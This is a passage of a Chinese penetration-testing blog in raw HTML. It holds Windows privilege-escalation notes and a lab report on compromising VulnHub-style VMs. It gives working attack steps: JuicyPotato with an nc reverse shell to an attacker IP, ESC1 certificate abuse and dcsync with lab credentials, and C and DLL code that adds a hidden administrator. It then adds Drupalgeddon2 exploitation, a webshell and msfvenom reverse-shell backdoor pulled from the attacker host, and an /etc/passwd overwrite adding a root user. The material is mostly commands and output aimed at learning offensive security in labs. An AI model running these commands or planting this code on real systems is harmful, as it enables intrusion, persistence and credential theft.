class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line"></span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer</span><br><span class="line">AlwaysInstallElevated   REG_DWORD   <span class="number">0</span>x1</span><br></pre></td></tr></table></figure><h3 id="seimpersonateprivilegesecreateglobalprivilege"><a class="markdownIt-Anchor" href="#seimpersonateprivilegesecreateglobalprivilege"></a> SeImpersonatePrivilege/SeCreateGlobalPrivilege</h3><p><a href="https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe">https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe</a></p><p>针对新版本Windows系统<br /><a href="https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip">https://github.com/antonioCoco/JuicyPotatoNG/releases/download/v1.1/JuicyPotatoNG.zip</a></p><p>仅用于SeImpersonatePrivilege, 不触发Windows Defender<br /><a href="https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe">https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv</span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name  Description   State  </span><br><span class="line">======================= ========================================= =======</span><br><span class="line">SeChangeNotifyPrivilege Bypass traverse checking  Enabled</span><br><span class="line">SeImpersonatePrivilege  Impersonate a client after authentication Enabled</span><br><span class="line">SeCreateGlobalPrivilege Create global objects   Enabled</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>如果开启SeImpersonate权限，juicypotato的参数可以使用-t t</li><li>如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u</li><li>-t * 为两个均尝试</li><li>如果均未开启，那么无法提权</li></ul><blockquote><p><a href="https://blog.csdn.net/god_zzZ/article/details/106334702">https://blog.csdn.net/god_zzZ/article/details/106334702</a></p></blockquote><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotato.exe -t t -p &quot;./nc.exe&quot; -a &quot;-e c:\windows\system32\<span class="built_in">cmd</span>.exe <span class="number">10</span>.<span class="number">10</span>.*.* <span class="number">9995</span>&quot; -l <span class="number">6666</span> -c &#123;F7FD3FD6-<span class="number">9994</span>-<span class="number">452</span>D-<span class="number">8</span>DA7-<span class="number">9</span>A8FD87AEEF4&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JuicyPotatoNG.exe -t t -p &quot;./nc.exe&quot; -a &quot;-e c:\windows\system32\<span class="built_in">cmd</span>.exe <span class="number">10</span>.<span class="number">10</span>.*.* <span class="number">9995</span>&quot;</span><br></pre></td></tr></table></figure><p>CLSID</p><blockquote><p><a href="https://github.com/ohpe/juicy-potato/tree/master/CLSID">https://github.com/ohpe/juicy-potato/tree/master/CLSID</a></p></blockquote><p>Meterpreter</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">load incognito</span><br><span class="line">list_tokens -g</span><br><span class="line">impersonate_token <span class="string">&quot;BUILTIN\Administrators&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ps | grep services.exe</span><br><span class="line">Filtering on &#x27;services.exe&#x27;</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID  PPID  Name  Arch  Session  User   <span class="built_in">Path</span></span><br><span class="line"> ---  ----  ----  ----  -------  ----   ----</span><br><span class="line"> <span class="number">668</span>  <span class="number">580</span>   services.exe  x64   <span class="number">0</span>  NT AUTHORITY\SYSTEM  C:\Windows\System32\services.exe</span><br><span class="line">migrate <span class="number">668</span></span><br></pre></td></tr></table></figure><h3 id="错误配置证书模板"><a class="markdownIt-Anchor" href="#错误配置证书模板"></a> 错误配置证书模板</h3><blockquote><p>This is a quick lab to familiarize with ECS1 privilege escalation technique, that illustrates how it’s possible to elevate from a regular user to domain administrator in a Windows Domain by abusing over-permissioned Active Directory Certificate Services (ADCS) certificate templates.<br /><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin</a></p></blockquote><ul><li>msPKI-Certificates-Name-Flag: ENROLLEE_SUPPLIES_SUBJECT # 任意证书申请对象</li><li>PkiExtendedKeyUsage: Client Authentication # 证书可用于AD</li><li>Enrollment Rights: Authenticated Users # 证书申请者为经验证的域用户</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install certipy-ad</span><br></pre></td></tr></table></figure><p>查询是否存在错误配置的证书模板</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -vulnerable -stdout -u ryan.cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">[*] Enumeration output:</span><br><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">CA Name   : sequel-DC-CA</span><br><span class="line">DNS Name: dc.sequel.htb</span><br><span class="line">Certificate Subject   : CN&#x3D;sequel-DC-CA, DC&#x3D;sequel, DC&#x3D;htb</span><br><span class="line">Certificate Serial Number : 1EF2FA9A7E6EADAD4F5382F4CE283101</span><br><span class="line">Certificate Validity Start  : 2022-11-18 20:58:46+00:00</span><br><span class="line">Certificate Validity End: 2121-11-18 21:08:46+00:00</span><br><span class="line">Web Enrollment  : Disabled</span><br><span class="line">User Specified SAN  : Disabled</span><br><span class="line">Request Disposition   : Issue</span><br><span class="line">Enforce Encryption for Requests  : Enabled</span><br><span class="line">Permissions</span><br><span class="line">  Owner   : SEQUEL.HTB\Administrators</span><br><span class="line">  Access Rights</span><br><span class="line">ManageCertificates  : SEQUEL.HTB\Administrators</span><br><span class="line">  SEQUEL.HTB\Domain Admins</span><br><span class="line">  SEQUEL.HTB\Enterprise Admins</span><br><span class="line">ManageCa: SEQUEL.HTB\Administrators</span><br><span class="line">  SEQUEL.HTB\Domain Admins</span><br><span class="line">  SEQUEL.HTB\Enterprise Admins</span><br><span class="line">Enroll  : SEQUEL.HTB\Authenticated Users</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">Template Name : UserAuthentication</span><br><span class="line">Display Name: UserAuthentication</span><br><span class="line">Certificate Authorities   : sequel-DC-CA</span><br><span class="line">Enabled   : True</span><br><span class="line">Client Authentication : True</span><br><span class="line">Enrollment Agent: False</span><br><span class="line">Any Purpose   : False</span><br><span class="line">Enrollee Supplies Subject : True</span><br><span class="line">Certificate Name Flag : EnrolleeSuppliesSubject</span><br><span class="line">Enrollment Flag   : PublishToDs</span><br><span class="line">  IncludeSymmetricAlgorithms</span><br><span class="line">Private Key Flag: 16777216</span><br><span class="line">  65536</span><br><span class="line">  ExportableKey</span><br><span class="line">Extended Key Usage  : Client Authentication</span><br><span class="line">  Secure Email</span><br><span class="line">  Encrypting File System</span><br><span class="line">Requires Manager Approval : False</span><br><span class="line">Requires Key Archival : False</span><br><span class="line">Authorized Signatures Required  : 0</span><br><span class="line">Validity Period   : 10 years</span><br><span class="line">Renewal Period  : 6 weeks</span><br><span class="line">Minimum RSA Key Length  : 2048</span><br><span class="line">Permissions</span><br><span class="line">  Enrollment Permissions</span><br><span class="line">Enrollment Rights : SEQUEL.HTB\Domain Admins</span><br><span class="line">  SEQUEL.HTB\Domain Users</span><br><span class="line">  SEQUEL.HTB\Enterprise Admins</span><br><span class="line">  Object Control Permissions</span><br><span class="line">Owner : SEQUEL.HTB\Administrator</span><br><span class="line">Write Owner Principals  : SEQUEL.HTB\Domain Admins</span><br><span class="line">  SEQUEL.HTB\Enterprise Admins</span><br><span class="line">  SEQUEL.HTB\Administrator</span><br><span class="line">Write Dacl Principals : SEQUEL.HTB\Domain Admins</span><br><span class="line">  SEQUEL.HTB\Enterprise Admins</span><br><span class="line">  SEQUEL.HTB\Administrator</span><br><span class="line">Write Property Principals : SEQUEL.HTB\Domain Admins</span><br><span class="line">  SEQUEL.HTB\Enterprise Admins</span><br><span class="line">  SEQUEL.HTB\Administrator</span><br><span class="line">[!] Vulnerabilities</span><br><span class="line">  ESC1  : &#39;SEQUEL.HTB\\Domain Users&#39; can enroll, enrollee supplies subject and template allows client authentication</span><br></pre></td></tr></table></figure><p>域用户<code>ryan.cooper</code>为域管理员<code>administrator</code>申请证书</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy req -u ryan.cooper@sequel.htb -p NuclearMosquito3 -target dc.sequel.htb -template UserAuthentication -ca sequel-DC-CA -upn administrator@sequel.htb</span><br></pre></td></tr></table></figure><p>使用证书通过Kerberos生成TGT并还原为NT Hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx -dc-ip 10.10.11.202</span><br></pre></td></tr></table></figure><h3 id="dcsync"><a class="markdownIt-Anchor" href="#dcsync"></a> dcsync</h3><blockquote><p>“With both GetChanges and GetChangesAll privileges in BloodHound, you may perform a dcsync attack to get the password hash of an arbitrary principal using mimikatz”<br /><a href="https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall">https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#getchanges-getchangesall</a><br />mimikatz<br />有一个dcsync功能, 可以利用卷影拷贝服务直接读取ntds.dll文件并检索域散列值。<br />《内网安全攻防》 P.296</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python secretsdump.py -dc-ip 10.10.10.30 megacorp.local/svc_bes:Sheffield19@10.10.10.30</span><br></pre></td></tr></table></figure><h3 id="服务"><a class="markdownIt-Anchor" href="#服务"></a> 服务</h3><h4 id="服务程序"><a class="markdownIt-Anchor" href="#服务程序"></a> 服务程序</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object &#123;$_.State -like &#39;Running&#39;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">i = system (<span class="string">&quot;net user bfl bfl123456. /add&quot;</span>);</span><br><span class="line">i = system (<span class="string">&quot;net localgroup administrators bfl /add&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x86_64-w64-mingw32-gcc bfl.c -o bfl.exe</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Restart-Service ServiceName</span><br></pre></td></tr></table></figure><h4 id="dll劫持"><a class="markdownIt-Anchor" href="#dll劫持"></a> DLL劫持</h4><blockquote><p><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procmon">https://learn.microsoft.com/en-us/sysinternals/downloads/procmon</a></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HANDLE hModule,<span class="comment">// Handle to DLL module</span></span></span></span><br><span class="line"><span class="function"><span class="params">DWORD ul_reason_for_call,<span class="comment">// Reason for calling function</span></span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpReserved )</span> <span class="comment">// Reserved</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> ( ul_reason_for_call )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH: <span class="comment">// A process is loading the DLL.</span></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">i = system (<span class="string">&quot;net user bfl bfl123456. /add&quot;</span>);</span><br><span class="line">i = system (<span class="string">&quot;net localgroup administrators bfl /add&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH: <span class="comment">// A process is creating a new thread.</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH: <span class="comment">// A thread exits normally.</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH: <span class="comment">// A process unloads the DLL.</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x86_64-w64-mingw32-gcc bfl.cpp --shared -o bfl.dll</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Restart-Service ServiceName</span><br></pre></td></tr></table></figure><h4 id="unquoted-service-paths"><a class="markdownIt-Anchor" href="#unquoted-service-paths"></a> Unquoted Service Paths</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Buffer Fly\Bufferfly.exe</span><br></pre></td></tr></table></figure><p>=&gt;</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Program.exe</span><br><span class="line">C:\Program Files\Buffer.exe</span><br><span class="line">C:\Program Files\Buffer Fly\Bufferfly.exe</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object &#123;$_.State -like &#39;Running&#39;&#125;</span><br></pre></td></tr></table></figure><h3 id="计划任务"><a class="markdownIt-Anchor" href="#计划任务"></a> 计划任务</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;迟来的文章&lt;/p&gt;</summary>
    
    
    
    <category term="Study" scheme="https://yoloyolo.top/categories/Study/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
  </entry>
  
  <entry>
    <title>Pentest With Meterpreter</title>
    <link href="https://yoloyolo.top/2023/02/08/Pentest-With-Meterpreter/"/>
    <id>https://yoloyolo.top/2023/02/08/Pentest-With-Meterpreter/</id>
    <published>2023-02-08T02:55:36.000Z</published>
    <updated>2023-07-16T09:03:18.943Z</updated>
    
    <content type="html"><![CDATA[<p>迟来的文章</p><a id="more"></a><h1 id="渗透测试报告"><a class="markdownIt-Anchor" href="#渗透测试报告"></a> 渗透测试报告</h1><p><code>2019/1/28 16:49:43</code></p><hr \><h2 id="任务规划"><a class="markdownIt-Anchor" href="#任务规划"></a> 任务规划</h2><p>规划区域：虚拟机中的三台服务器<br />测试目标：获取所有服务器的root权限</p><p>渗透目标</p><ul><li><p>A1 hackNos(Ubuntu)<br />IP.0:192.168.31.132<br />IP.1:Unknown</p></li><li><p>A2 lin.security(Ubuntu)<br />IP.0:Unknown<br />IP.1:Unknown</p></li><li><p>A3 hackNos-2(Ubuntu)<br />IP.0:Unknown</p></li></ul><p>攻击方</p><ul><li>B Attacker(Kali)<br />IP.0:192.168.31.10</li></ul><p>网络状况：<br />B能与A1进行网络通信<br />A1能与B和A2进行网络通信<br />A2能与A1进行网络通信</p><h2 id="hacknos"><a class="markdownIt-Anchor" href="#hacknos"></a> hackNos</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><p>用Nmap对目标A1进行端口扫描</p><p><code>nmap -sV -p 1-1000 -T 5 -v -A -n 192.168.31.132</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.31.132</span><br><span class="line">Host is up (0.011s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)</span><br><span class="line">|   256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)</span><br><span class="line">|_  256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: OPTIONS GET HEAD POST</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="web路径枚举"><a class="markdownIt-Anchor" href="#web路径枚举"></a> Web路径枚举</h3><p><code>dirb http://192.168.31.132 -w</code></p><p>用dirb进行Web目录枚举</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.31.132&#x2F;drupal&#x2F; </span><br></pre></td></tr></table></figure><p>发现Web服务中存在Drupal框架</p><h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h3><p>搜索得知Drupal框架存在RCE漏洞<br /><code>git clone https://github.com/dreadlocked/Drupalgeddon2.git</code></p><p>尝试对A1使用Exploit</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt install ruby</span><br><span class="line">gem install highline</span><br><span class="line">ruby drupalgeddon2.rb http:&#x2F;&#x2F;192.168.31.132&#x2F;drupal&#x2F;</span><br></pre></td></tr></table></figure><p>成功获取shell</p><h3 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h3><p>本地构造Webshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weevely generate pass she.php</span><br></pre></td></tr></table></figure><p>开启本地Web服务<br /><code>python -m SimpleHTTPServer 8000 &amp;</code></p><p>在A1上用wget获取WebShell<br /><code>wget http://192.168.31.10:8000/she.php</code></p><p>连接WebShell<br /><code>weevely http://192.168.31.132/drupal/she.php pass</code></p><p>查看系统信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname -a</span><br><span class="line">Linux hackNos 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:01:15 UTC 2019 i686 i686 i686 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>生成Meterpreter后门程序并投放<br /><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.31.10 LPORT=1234 -e x86/shikata_ga_nai -i 11 -f elf &gt; msf.elf</code></p><p>利用WebShell上传后门程序<br /><code>file_upload /root/software/msf.elf /var/www/html/drupal/msf.elf</code></p><p>使用MSF进行渗透攻击</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.31.10</span><br><span class="line">set LPORT 1234</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>在A1的WebShell中运行后门程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x msf.elf</span><br><span class="line">.&#x2F;msf.elf</span><br></pre></td></tr></table></figure><p>将meterpreter shell转为bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>查看具有suid权限且属于root用户的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&lt;pal$ find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper           </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign                          </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;i386-linux-gnu&#x2F;lxc&#x2F;lxc-user-nic              </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device                     </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;snapd&#x2F;snap-confine                           </span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1            </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgidmap                                    </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd                                      </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newuidmap                                    </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;wget                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd                                       </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh                                         </span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn                                         </span><br><span class="line">&#x2F;bin&#x2F;ping6                                            </span><br><span class="line">&#x2F;bin&#x2F;umount                                           </span><br><span class="line">&#x2F;bin&#x2F;ntfs-3g                                          </span><br><span class="line">&#x2F;bin&#x2F;mount                                            </span><br><span class="line">&#x2F;bin&#x2F;ping                                             </span><br><span class="line">&#x2F;bin&#x2F;su                                               </span><br><span class="line">&#x2F;bin&#x2F;fusermount                                       </span><br></pre></td></tr></table></figure><p>可以用wget命令提权</p><p>对/etc/passwd文件进行间接修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hackNos: file_download &#x2F;etc&#x2F;passwd passwd</span><br><span class="line">perl -le &#39;print crypt(&quot;hackforfun&quot;,&quot;addedsalt&quot;)&#39;</span><br><span class="line">    adWo3GnVnKzuU</span><br><span class="line">echo &#39;test:adWo3GnVnKzuU:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwd</span><br><span class="line">hackNos: wget http:&#x2F;&#x2F;192.168.31.10:8000&#x2F;passwd -O &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure><p>在bash中切换账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">su test</span><br><span class="line">hackforfun</span><br><span class="line">id</span><br><span class="line">    uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><p>在Meterpreter查看A1的网络信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 